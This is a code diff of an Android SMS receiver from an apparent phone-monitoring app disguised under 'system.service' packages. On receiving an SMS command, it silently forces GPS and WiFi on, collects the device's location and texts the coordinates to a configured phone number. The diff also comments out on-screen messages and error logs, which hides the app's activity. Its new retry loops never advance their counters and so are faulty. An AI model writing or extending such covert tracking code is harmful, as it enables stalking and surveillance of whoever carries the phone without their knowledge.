@@ -14,6 +14,7 @@ import com.particle.inspector.common.util.sms.SmsConsts;
 import com.particle.inspector.common.util.sms.SuperLoggingSms;
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.GpsUtil;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
 import com.particle.inspector.common.util.NetworkUtil;
@@ -24,6 +25,7 @@ import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 
 import system.service.feature.location.CellInfoManager;
 import system.service.feature.location.CellLocationManager;
+import system.service.feature.location.LocationInfo;
 import system.service.feature.location.LocationUtil;
 import system.service.feature.location.WifiInfoManager;
 import system.service.feature.sms.SmsCtrl;
@@ -38,6 +40,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
+import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.os.Looper;
@@ -59,7 +62,7 @@ public class SmsReceiver extends BroadcastReceiver
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
+		android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
@@ -95,7 +98,7 @@ public class SmsReceiver extends BroadcastReceiver
 				if (licType == LICENSE_TYPE.TRIAL_LICENSED) {
 					// If it is out of trial, return 
 					if (!ConfigCtrl.stillInTrial(context)) {
-						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_has_sent_trial_expire_sms));
+						//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_has_sent_trial_expire_sms));
 						return;
 					}
 
@@ -109,12 +112,12 @@ public class SmsReceiver extends BroadcastReceiver
 				else if (licType == LICENSE_TYPE.SUPER_LICENSED) {
 					// Save license key info to SharedPreferences
 					if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
-						Log.e(LOGTAG, "Cannot set license key");
+						//Log.e(LOGTAG, "Cannot set license key");
 					}
 
 					if (!ConfigCtrl.setLicenseType(context, LICENSE_TYPE.SUPER_LICENSED)) {
-						Log.e(LOGTAG, "Cannot set license type");
-						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
+						//Log.e(LOGTAG, "Cannot set license type");
+						//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
 						return;
 					}
 
@@ -140,22 +143,19 @@ public class SmsReceiver extends BroadcastReceiver
 					{
 						// Make sure the 2G/3G mobile networks available for sending/receiving validation SMS
 						if (!DeviceProperty.isMobileConnected(context)) {
-							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_mobile_net_unvailable));
+							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_mobile_net_unvailable));
 							return;
 						}
 
 						boolean ret = SmsCtrl.sendAuthSms(context, smsBody);
 						if (ret) {
-							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_success));
+							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_success));
 							ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
 						} else {
-							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_fail));
+							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_fail));
 						}
 					}
 				}
-
-				// Send SMS to server to update last activated datetime
-				//TODO
 
 				// Start dialog
 				Intent initIntent = new Intent().setClass(context, InitActivity.class);
@@ -190,8 +190,8 @@ public class SmsReceiver extends BroadcastReceiver
 						// Save license type info to SharedPreferences
 						LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, parts[1]);
 						if (!ConfigCtrl.setLicenseType(context, type)) {
-							Log.e(LOGTAG, "Cannot set license type");
-							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
+							//Log.e(LOGTAG, "Cannot set license type");
+							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
 							return;
 						}
 
@@ -205,9 +205,9 @@ public class SmsReceiver extends BroadcastReceiver
 						// TODO
 					} else if (parts[3].equalsIgnoreCase(SmsConsts.FAILURE)) {
 						if (parts.length >= 4) {
-							SysUtils.messageBox(context, parts[3]);
+							//SysUtils.messageBox(context, parts[3]);
 						} else {
-							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
+							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
 						}
 					}
 				}
@@ -281,51 +281,81 @@ public class SmsReceiver extends BroadcastReceiver
 				// Start a new thread to do the time-consuming job
     			new Thread(new Runnable(){
     				public void run() {
-    					CellInfoManager cellManager = new CellInfoManager(SmsReceiver.this.context);
-    		            WifiInfoManager wifiManager = new WifiInfoManager(SmsReceiver.this.context);
-    		            CellLocationManager locationManager = new CellLocationManager(SmsReceiver.this.context, cellManager, wifiManager) {
-    		            	@Override
-    		                public void onLocationChanged() {
-    		            		String sms = String.format(SmsReceiver.this.context.getResources().getString(R.string.location_sms), 
-    		    						String.format("%.6f,%.6f", this.latitude(), this.longitude()));
-    		            		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
-    		            		boolean ret = SmsCtrl.sendSms(phoneNum, sms);
-    		                    this.stop();
-    		                }
-    		            };
-    		            locationManager.start();
-    					
-    					/*
     					String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
     					if (BootService.locationUtil == null) {
     						return;
     					}
-    					BootService.locationUtil.sentSMS = false;
-    					String realOrHist = LocationUtil.REALPOSITION;
-    					String type       = LocationUtil.GPS;
-    					Location location = BootService.locationUtil.getGeoLocation(type, realOrHist);
+    					LocationInfo location = getGeoLocation();
     					String locationSms = "";
     					if (location != null) {
-    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location, type, realOrHist);
+    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location);
     					}
     					else {
-    						String gsmOr3G = BaseStationUtil.G3;
-    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context, gsmOr3G);
-    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc, gsmOr3G);
+    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context);
+    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc);
     					}
     					
-    					if (!BootService.locationUtil.sentSMS) {
-    						boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
-    						BootService.locationUtil.sentSMS = true;
-    					}
-    					Looper.loop();
-    					*/
+    					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
     				}
     			}).start();
 			}
 		} // end of SMS_RECEIVED
         
 	} // end of onReceive()
+	
+	public LocationInfo getGeoLocation()
+	{
+		// If GPS is not enabled, try to enable it
+		boolean tryToEnableGPS = false;
+		if (!GpsUtil.isGpsEnabled(context)) {
+			int tryCount = 0;
+			while (!GpsUtil.isGpsEnabled(context) && tryCount < 5) {
+				GpsUtil.enableGPS(context);
+				SysUtils.threadSleep(5000, LOGTAG);
+			}
+			
+			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
+		}
+		
+        // If WIFI is not enabled, try to enable it
+     	boolean tryToEnableWifi = false;
+     	if (!NetworkUtil.isWifiConnected(context)) {
+     		int tryCount = 0;
+     		while (!NetworkUtil.isWifiConnected(context) && tryCount < 5) {
+     			NetworkUtil.enableWifi(context);
+     			SysUtils.threadSleep(5000, LOGTAG);
+     		}
+     			
+     		if (NetworkUtil.isWifiConnected(context)) tryToEnableWifi = true;
+     	}
+		
+		// Try to sleep for a while for the LocationUtil to update location records
+     	SysUtils.threadSleep(50000, LOGTAG);
+     	LocationInfo location = null;
+     	int tryCount = 0;
+     	while (location == null && tryCount <= 7) {
+     		tryCount++;
+     		SysUtils.threadSleep(10000, LOGTAG);
+    	   	if (BootService.locationUtil.locationGpsQueue.size() > 0) {
+    	   		location = new LocationInfo(BootService.locationUtil.locationGpsQueue.getLast(), LocationInfo.GPS);
+        	}
+    	   	else if (BootService.locationUtil.locationWifiQueue.size() > 0) {
+    	   		location = new LocationInfo(BootService.locationUtil.locationWifiQueue.getLast(), LocationInfo.WIFI);
+        	}
+     	}
+	    	
+	    // If GPS previously forced to be enabled, try to disable it
+	   	if (tryToEnableGPS) {
+	   		GpsUtil.disableGPS(context);
+	   	}
+	   	
+	    // If network previously forced to be enabled, try to disable it
+    	if (tryToEnableWifi) {
+    		NetworkUtil.disableWifi(context);
+    	}
+	   	
+    	return location;
+    }	
 	
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
